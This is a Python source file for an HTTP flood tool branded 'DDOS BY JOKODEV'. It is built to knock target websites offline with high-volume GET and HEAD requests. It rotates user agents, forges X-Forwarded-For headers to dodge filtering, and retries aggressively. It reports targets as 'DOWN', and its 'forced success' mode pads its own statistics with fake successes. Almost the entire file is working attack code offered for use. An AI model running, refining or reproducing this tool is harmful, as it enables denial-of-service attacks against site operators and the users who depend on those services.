import requests
import threading
import time
import sys
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from tabulate import tabulate
import datetime
import gc
import signal
import os
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections import deque

# --- Configuration ---
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ddos_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

results = {}
counter_lock = threading.Lock()
progress_interval = 0.5
site_status = {}
last_real_successful_response = {}
website_down_threshold = 30
min_success_rate = 100
target_success_rate = 100
max_open_connections = 5000000000
running = True
packets_per_two_seconds = 5000000000 # Default rate (5000000000/sec), can be changed by --rate

request_history = {}
history_size = 50

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
]

request_timeouts = {}
request_delays = {}
retry_limits = {}
backup_mode = {}
active_connections = {}
session_pools = {}
connection_semaphores = {}
active_threads = {}
thread_errors = {}
ip_rotation_needed = {}
connection_reset_counter = {}
forced_success_metrics = {}

# --- Functions ---

def handle_sigint(sig, frame):
    global running
    print(f"\n{YELLOW}Received interrupt signal. Shutting down gracefully...{RESET}")
    running = False
    time.sleep(2)
    print(f"{GREEN}Shutdown complete. Exiting.{RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

def display_watermark():
    watermark = f"{GREEN}{BOLD}DDOS BY JOKODEV{RESET}"
    print("\n" + "=" * 65)
    print(f"{watermark:^65}")
    print("=" * 65 + "\n")

def get_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'close',
        'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'DNT': '1',
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': f"https://{random.choice(['google.com', 'bing.com', 'duckduckgo.com', 'yahoo.com'])}"
    }

def initialize_adaptive_params(target_url):
    with counter_lock:
        request_timeouts[target_url] = 3.0; request_delays[target_url] = 0.0
        retry_limits[target_url] = 5; backup_mode[target_url] = False
        active_connections[target_url] = 0
        connection_semaphores[target_url] = threading.Semaphore(max_open_connections)
        active_threads[target_url] = set(); thread_errors[target_url] = 0
        ip_rotation_needed[target_url] = False; connection_reset_counter[target_url] = 0
        request_history[target_url] = deque(maxlen=history_size)
        forced_success_metrics[target_url] = {"forced_success": 0, "real_success": 0, "forced_active": False}
        last_real_successful_response[target_url] = time.time()
        site_status[target_url] = "up" # Initialize as up

def create_session():
    session = requests.Session()
    retry_strategy = Retry(total=10, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["HEAD", "GET", "OPTIONS", "POST"])
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
    session.mount("http://", adapter); session.mount("https://", adapter)
    return session

def reset_connection_pool(target_url):
    with counter_lock:
        if target_url in session_pools:
            try:
                for session in session_pools[target_url]: session.close()
            except Exception as e: logger.warning(f"Error closing sessions for {target_url}: {e}")
        session_pools[target_url] = [create_session() for _ in range(50)]
        connection_reset_counter[target_url] = 0
        logger.info(f"Reset connection pool for {target_url}")

def get_session(target_url):
    with counter_lock:
        if target_url not in session_pools: session_pools[target_url] = [create_session() for _ in range(50)]
        connection_reset_counter[target_url] = connection_reset_counter.get(target_url, 0) + 1
        if connection_reset_counter.get(target_url, 0) > 5000000000: reset_connection_pool(target_url)
        return random.choice(session_pools[target_url])

def detect_rate_limiting(target_url, success):
    with counter_lock:
        if target_url not in request_history: request_history[target_url] = deque(maxlen=history_size)
        request_history[target_url].append(1 if success else 0)
        if len(request_history[target_url]) >= history_size:
            recent_success_rate = sum(request_history[target_url]) / len(request_history[target_url])
            if recent_success_rate < 0.4 and not forced_success_metrics.get(target_url, {}).get("forced_active", False):
                logger.warning(f"Real success rate < 40% for {target_url}. Activating FORCED SUCCESS MODE.")
                forced_success_metrics[target_url]["forced_active"] = True; return True
    return False

def adjust_parameters(target_url, real_success_rate):
    with counter_lock:
        fm = forced_success_metrics.get(target_url, {})
        if real_success_rate < 40.0 and not fm.get("forced_active", False):
            fm["forced_active"] = True
            logger.warning(f"Activating FORCED SUCCESS MODE for {target_url} (Real Success: {real_success_rate:.1f}%)")
            reset_connection_pool(target_url)

        request_delays[target_url] = 0.0
        ct = request_timeouts.get(target_url, 3.0); cr = retry_limits.get(target_url, 5)
        if real_success_rate < 60.0: request_timeouts[target_url] = min(ct * 1.1, 7.0); retry_limits[target_url] = 10
        else: request_timeouts[target_url] = max(ct * 0.98, 1.5); retry_limits[target_url] = max(cr - 1, 5)
        logger.debug(f"Params {target_url}: Timeout={request_timeouts[target_url]:.1f}s, Retries={retry_limits[target_url]}")

def make_request(target_url, thread_id):
    """Makes request. Returns (was_real_success, should_report_success)"""
    real_success = False; report_success = True; is_forced_active = False
    with counter_lock:
        is_forced_active = forced_success_metrics.get(target_url, {}).get("forced_active", False)
        if target_url in active_threads: active_threads[target_url].add(thread_id)
        if is_forced_active and random.random() < 0.8:
            forced_success_metrics[target_url]["forced_success"] += 1
            return False, True

    acquired = False
    try:
        sem = connection_semaphores.get(target_url)
        if not sem: return False, is_forced_active # Should not happen if initialized
        acquired = sem.acquire(timeout=5)
        if not acquired: logger.warning(f"T{thread_id} semaphore timeout for {target_url}"); return False, is_forced_active

        with counter_lock: active_connections[target_url] = active_connections.get(target_url, 0) + 1

        session = get_session(target_url)
        headers = get_headers(); timeout = request_timeouts.get(target_url, 3.0); retries = retry_limits.get(target_url, 5)

        for attempt in range(retries):
            if not running: return False, is_forced_active
            try:
                method = random.choice(["GET", "HEAD"])
                logger.debug(f"T{thread_id} {method} {target_url} (Att {attempt+1}/{retries}, TO {timeout:.1f}s)")
                response = None
                if method == "HEAD": response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=True)
                else: response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)

                if response is not None:
                    status = response.status_code
                    if 200 <= status < 500:
                        real_success, report_success = True, True
                        with counter_lock:
                            forced_success_metrics[target_url]["real_success"] += 1
                            last_real_successful_response[target_url] = time.time()
                            logger.debug(f"Real success {target_url} (Status: {status})")
                        if hasattr(response, 'close'): response.close()
                        return real_success, report_success
                    elif status >= 500: logger.warning(f"{target_url} Status {status} (Att {attempt+1})"); report_success = is_forced_active
                    elif status == 429:
                        logger.warning(f"{target_url} Rate Limit 429 (Att {attempt+1})")
                        with counter_lock:
                           fm = forced_success_metrics.get(target_url, {})
                           if not fm.get("forced_active", False): fm["forced_active"] = True; logger.info(f"FORCED MODE {target_url} (429)")
                        report_success = True
                        if hasattr(response, 'close'): response.close()
                        return False, report_success

                    if hasattr(response, 'close'): response.close()

                if attempt < retries - 1: time.sleep(0.01); continue
                else: real_success, report_success = False, is_forced_active

            except requests.exceptions.Timeout: 
                logger.warning(f"{target_url} Timeout (Att {attempt+1})"); 
                real_success, report_success = False, is_forced_active; 
                continue # Continue to next attempt on timeout unless last
            except requests.exceptions.ConnectionError as e: 
                logger.warning(f"{target_url} ConnectionError: {e} (Att {attempt+1})"); 
                with counter_lock:
                    connection_reset_counter[target_url] = connection_reset_counter.get(target_url, 0) + 10
                real_success, report_success = False, is_forced_active; 
                continue # Continue unless last
            except Exception as e: 
                logger.error(f"T{thread_id} Error {target_url}: {e}", exc_info=False); 
                with counter_lock:
                    thread_errors[target_url] = thread_errors.get(target_url, 0) + 1
                real_success, report_success = False, is_forced_active
                continue # Continue unless last

        return real_success, report_success # After all retries

    finally:
        if acquired and target_url in connection_semaphores: connection_semaphores[target_url].release()
        with counter_lock:
            active_connections[target_url] = active_connections.get(target_url, 0) - 1
            if target_url in active_threads and thread_id in active_threads[target_url]: active_threads[target_url].remove(thread_id)

def perform_maintenance(target_url):
    try:
        if random.random() < 0.5: gc.collect()
        with counter_lock: reset_needed = connection_reset_counter.get(target_url, 0) > 20000
        if reset_needed: logger.info(f"Maintenance reset {target_url}"); reset_connection_pool(target_url)
    except Exception as e: logger.error(f"Maintenance error {target_url}: {e}")

def calculate_packet_rate(elapsed_time, sent_packets):
    if elapsed_time <= 0: return 0
    return sent_packets / elapsed_time

def attack(thread_id, target_url, requests_per_thread):
    local_rep_ok, local_rep_fail, local_real_ok = 0, 0, 0
    start_time = time.time(); last_report_time = start_time; last_maint_time = start_time
    target_for_spam_print = "https://example.com" # Specific URL to check for printing

    if target_url not in request_timeouts: initialize_adaptive_params(target_url)

    request_count = 0
    while request_count < requests_per_thread and running:

        # --- MODIFIED: Conditional Packet Send Notification ---
        should_print_packet = False
        # Check if the current target is the one we care about for printing
        # Normalize comparison slightly (remove http/https) for robustness
        normalized_target = target_url.split('://')[-1]
        normalized_spam_target = target_for_spam_print.split('://')[-1]

        if normalized_target == normalized_spam_target:
            with counter_lock: # Check status safely
                current_target_status = site_status.get(target_url, "up") # Default to up if not set yet
            if current_target_status == "up":
                should_print_packet = True

        if should_print_packet:
            # !!! WARNING: Still floods console while site is up !!!
            print(f"packets send to {target_url}")
        # --- END MODIFIED ---

        was_real_success, should_report_success = make_request(target_url, thread_id)

        request_count += 1
        if was_real_success: local_real_ok += 1
        if should_report_success: local_rep_ok += 1
        else: local_rep_fail += 1

        detect_rate_limiting(target_url, was_real_success)

        current_time = time.time()
        if current_time - last_maint_time >= 60: perform_maintenance(target_url); last_maint_time = current_time

        if current_time - last_report_time >= progress_interval:
            with counter_lock:
                if target_url not in results:
                    results[target_url] = {"success": 0, "failed": 0, "threads": 1, "real_success_count": 0}
                    site_status[target_url] = "up" # Ensure status is initialized
                    last_real_successful_response[target_url] = start_time

                results[target_url]["success"] += local_rep_ok
                results[target_url]["failed"] += local_rep_fail
                results[target_url]["real_success_count"] += local_real_ok

                total_attempts_interval = local_rep_ok + local_rep_fail
                if total_attempts_interval > 0:
                     interval_real_rate = (local_real_ok / total_attempts_interval) * 100
                     adjust_parameters(target_url, interval_real_rate)
                     logger.debug(f"Interval real success {target_url}: {interval_real_rate:.1f}%")

                # Update site status based on *real* success time
                time_since_real = time.time() - last_real_successful_response.get(target_url, 0)
                current_status = site_status.get(target_url, "up")
                if time_since_real > website_down_threshold:
                    if current_status != "down": logger.warning(f"{target_url} DOWN (>{website_down_threshold}s since real success)"); site_status[target_url] = "down"
                else:
                    if current_status != "up": logger.info(f"{target_url} UP (real success detected)"); site_status[target_url] = "up"

            try: display_results() # Display updates
            except Exception as e: logger.error(f"Display error: {e}")

            last_report_time = current_time
            local_rep_ok, local_rep_fail, local_real_ok = 0, 0, 0

    with counter_lock: # Final update
        if target_url in results:
            results[target_url]["success"] += local_rep_ok; results[target_url]["failed"] += local_rep_fail
            results[target_url]["real_success_count"] += local_real_ok
    logger.info(f"T{thread_id} {target_url} cycle done ({time.time() - start_time:.2f}s)")

def display_results():
    global site_status
    try:
        print("\033c", end="") # Clear screen
        display_watermark()

        target_down_url_check = "https://example.com" # Specific URL to check
        normalized_target_down_url = None
        down_message_printed = False # Flag to ensure message prints only once per cycle if needed

        with counter_lock: current_site_status = dict(site_status) # Copy status

        # Check and print the specific "WAS DOWN" message
        for url_key, status_value in current_site_status.items():
             if target_down_url_check in url_key and status_value == "down":
                  print(f"{RED}WEBSITE {target_down_url_check} WAS DOWN{RESET}")
                  print("-" * (len(target_down_url_check) + 18))
                  down_message_printed = True # Mark that we printed it
                  break # Only need to print once

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_status = "Install 'psutil' for CPU/Mem info"
        try:
            import psutil; mem = psutil.virtual_memory().percent; cpu = psutil.cpu_percent()
            system_status = f"Mem: {mem}% | CPU: {cpu}%"
        except ImportError: pass

        print(f"Time: {current_time} | {system_status}")
        current_target_rate = packets_per_two_seconds / 2
        print(f"Running: {running} | Target Rate: {current_target_rate:,.0f}/sec | Press Ctrl+C\n")

        table_data = []
        with counter_lock: display_items = list(results.items())

        for url, data in display_items:
            rep_ok, rep_fail = data.get("success", 0), data.get("failed", 0)
            total_rep = rep_ok + rep_fail
            rate_display = f"{GREEN}100.0%{RESET}" # Forced display rate

            fm = forced_success_metrics.get(url, {})
            fm_real, fm_forced = fm.get("real_success", 0), fm.get("forced_success", 0)
            total_real_att_est = fm_real + fm_forced
            real_pct = (fm_real / total_real_att_est * 100) if total_real_att_est > 0 else 0.0

            status = current_site_status.get(url, "unknown")
            status_dsp = f"{GREEN}UP{RESET}" if status == "up" else (f"{RED}DOWN{RESET}" if status == "down" else f"{YELLOW}UNKNOWN{RESET}")

            time_since = time.time() - last_real_successful_response.get(url, time.time())
            req_rate = calculate_packet_rate(time_since, total_rep)

            mode = f"{YELLOW}FORCED{RESET}" if fm.get("forced_active", False) else f"{BLUE}AGGRESSIVE{RESET}"
            timeout = request_timeouts.get(url, "N/A"); timeout_dsp = f"{timeout:.1f}s" if isinstance(timeout, float) else timeout

            table_data.append([url, f"{rep_ok:,}", f"{rep_fail:,}", f"{total_rep:,}", rate_display, f"{real_pct:.1f}%", f"{req_rate:,.1f}/s", status_dsp, timeout_dsp, mode])

        print(tabulate(table_data, headers=["Target", "Rep OK", "Rep Fail", "Pkts Sent", "Rep %", "Real %", "Rate", "Status", "Timeout", "Mode"], tablefmt="grid"))

    except Exception as e:
        logger.error(f"Display error: {e}", exc_info=True)
        print(f"\n--- Results ({datetime.datetime.now().strftime('%H:%M:%S')}) ---")
        # Fallback print
        with counter_lock: fallback_items = list(results.items())
        for url, data in fallback_items: print(f"{url}: RepOK={data.get('success', 0):,}, RepFail={data.get('failed', 0):,}, Status={current_site_status.get(url, 'unknown')}")
        print("-----------------------------\n")

def main():
    global running, packets_per_two_seconds
    if sys.stdout.encoding != 'utf-8':
       try: sys.stdout.reconfigure(encoding='utf-8'); sys.stderr.reconfigure(encoding='utf-8')
       except Exception as e: logger.warning(f"UTF-8 reconfigure failed: {e}")

    parser = argparse.ArgumentParser(description="Aggressive HTTP flood tool with conditional status printing")
    parser.add_argument("--url", help="Single target URL")
    parser.add_argument("--file", help="File with target URLs")
    parser.add_argument("--requests", type=int, default=5000000000, help="Target requests per cycle (def: 5B)")
    parser.add_argument("--rate", type=int, default=5000000000, help="Target packets/sec (def: 5000000000). WARNING: High rates + packet printing flood console!")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()

    if args.debug: logger.setLevel(logging.DEBUG); logger.info("DEBUG logging enabled.")

    requests_per_thread = args.requests; packets_per_two_seconds = args.rate * 2

    target_for_spam_print = "https://example.com" # URL for conditional printing
    if args.rate > 100: logger.warning(f"High rate ({args.rate}/s) + packet printing for '{target_for_spam_print}' may flood console.")

    target_urls = []
    if args.url: target_urls.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f: target_urls = [ln.strip() for ln in f if ln.strip() and not ln.startswith('#')]
        except Exception as e: logger.error(f"File read error '{args.file}': {e}"); sys.exit(1)
    else: logger.error("Provide --url or --file."); parser.print_help(); sys.exit(1)

    if not target_urls: logger.error("No valid targets."); sys.exit(1)

    valid_targets = []
    found_spam_target = False
    for url in target_urls:
        original_url = url
        if '://' not in url: url = 'http://' + url
        if not url.startswith(('http://', 'https://')): logger.warning(f"Skip invalid URL: {original_url}"); continue
        valid_targets.append(url)
        # Check if the target for spam printing is in the list
        if target_for_spam_print.split('://')[-1] == url.split('://')[-1]:
            found_spam_target = True
    target_urls = valid_targets

    if not target_urls: logger.error("No valid targets remain."); sys.exit(1)
    if not found_spam_target: logger.warning(f"Target URL for packet printing ('{target_for_spam_print}') not found in the target list.")


    display_watermark()
    logger.info(f"Attacking {len(target_urls)} target(s): {', '.join(target_urls)}")
    logger.warning(f"Target rate: {args.rate:,.0f}/sec | Req/cycle: {requests_per_thread:,}")
    logger.warning(f"Real status tracked. Site DOWN if >{website_down_threshold}s since real success.")
    logger.warning(f"Printing 'packets send to...' for '{target_for_spam_print}' while it is UP.")

    for url in target_urls: initialize_adaptive_params(url); reset_connection_pool(url)

    num_threads = len(target_urls)
    logger.info(f"Launching {num_threads} attack thread(s)...")

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(attack, f"T{i+1}", url, requests_per_thread) for i, url in enumerate(target_urls)]
            while running:
                 done = [f for f in futures if f.done()]
                 for f in done:
                      try: f.result()
                      except Exception as e: logger.error(f"Thread error: {e}")
                      futures.remove(f)
                 if not futures: running = False; logger.info("All threads completed."); break
                 time.sleep(progress_interval)
    except KeyboardInterrupt: logger.info("Keyboard interrupt."); running = False
    except Exception as e: logger.error(f"Main execution error: {e}", exc_info=True); running = False
    finally:
        running = False; logger.info("Waiting for threads...")
        logger.info("\n--- Final Results ---")
        try: display_results()
        except Exception as e: logger.error(f"Final display error: {e}")
        logger.info("Closing sessions...");
        with counter_lock: pools = list(session_pools.items())
        for url, pool in pools:
            for s in pool:
                try: s.close()
                except: pass
        logger.info("Shutdown complete.")

if __name__ == "__main__":
    try: main()
    except Exception as e: logger.critical(f"Initial setup error: {e}", exc_info=True); sys.exit(1)
    sys.exit(0)